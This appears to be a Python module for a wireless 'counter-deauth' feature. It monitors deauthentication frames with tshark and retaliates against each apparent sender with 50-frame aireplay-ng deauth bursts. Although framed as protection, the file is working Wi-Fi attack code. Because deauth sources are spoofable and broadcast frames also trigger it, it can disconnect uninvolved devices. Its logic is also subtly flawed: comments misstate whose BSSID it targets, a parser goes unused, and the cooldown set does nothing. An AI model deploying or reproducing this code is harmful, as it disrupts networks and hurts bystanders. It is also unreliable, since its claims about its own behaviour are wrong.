import subprocess
import threading
import time

# Feature 7: Beacon Protection (Counter-Deauth)
# Monitors the wireless channel for incoming deauthentication frames targeting
# our protected device or AP. If detected, it immediately counter-attacks the
# source by deauthing it from its own BSSID.
# Uses tcpdump/tshark to detect frames and aireplay-ng to counter.

class BeaconProtection:
    def __init__(self, interface, protected_mac, bssid):
        self.interface = interface
        self.protected_mac = protected_mac.lower()
        self.bssid = bssid
        self._monitor_thread = None
        self._capture_process = None
        self._running = False
        self._attack_count = 0

    def log(self, msg):
        print(f"[BeaconProtection] {msg}")

    def _counter_attack(self, attacker_mac):
        """
        Fires a burst of deauth frames back at the attacker's source.
        Sends 50 frames to cancel their injection attempt.
        """
        self._attack_count += 1
        self.log(f"COUNTER-ATTACK #{self._attack_count}: Deauthing attacker {attacker_mac}")
        cmd = [
            "aireplay-ng", "-0", "50",
            "-a", self.bssid,
            "-c", attacker_mac,
            self.interface
        ]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _parse_deauth_frame(self, line):
        """
        Parses a tshark line looking for deauth frames targeting our device.
        Returns the source MAC of the attacker, or None if not relevant.
        """
        if "Deauthentication" not in line:
            return None
        if self.protected_mac not in line.lower() and self.bssid.lower() not in line.lower():
            return None
        # Extract source MAC (typically the third field in tshark output)
        parts = line.strip().split()
        if len(parts) >= 3:
            potential_mac = parts[2]
            if len(potential_mac) == 17 and potential_mac.count(":") == 5:
                if potential_mac.lower() not in (self.protected_mac, self.bssid.lower()):
                    return potential_mac
        return None

    def _monitor_loop(self):
        """
        Runs tshark to monitor beacon frames in real time.
        Pipes output line by line into the deauth frame parser.
        """
        self.log("Passive scan active. Watching for incoming deauth attacks...")
        cmd = [
            "tshark",
            "-i", self.interface,
            "-Y", "wlan.fc.type_subtype == 0x000c",  # 0x0c = deauth frame
            "-T", "fields",
            "-e", "frame.time",
            "-e", "wlan.sa",
            "-e", "wlan.da",
            "-l"
        ]
        try:
            self._capture_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                universal_newlines=True, bufsize=1
            )
            alerted = set()
            for line in self._capture_process.stdout:
                if not self._running:
                    break
                parts = line.strip().split("\t")
                if len(parts) >= 3:
                    source_mac = parts[1].lower()
                    dest_mac = parts[2].lower()
                    if dest_mac in (self.protected_mac, self.bssid.lower(), "ff:ff:ff:ff:ff:ff"):
                        if source_mac not in alerted:
                            alerted.add(source_mac)
                            t = threading.Thread(
                                target=self._counter_attack, args=(source_mac,), daemon=True
                            )
                            t.start()
                            time.sleep(1)  # Cooldown before acting on same source again
                            alerted.discard(source_mac)
        except FileNotFoundError:
            self.log("ERROR: 'tshark' not found. Install it with: sudo apt install tshark")

    def start(self):
        self._running = True
        self._monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self._monitor_thread.start()
        self.log(f"Beacon Protection enabled. Guarding: {self.protected_mac}")

    def stop(self):
        self._running = False
        if self._capture_process:
            self._capture_process.terminate()
        self.log(f"Beacon Protection stopped. {self._attack_count} counter-attacks fired.")
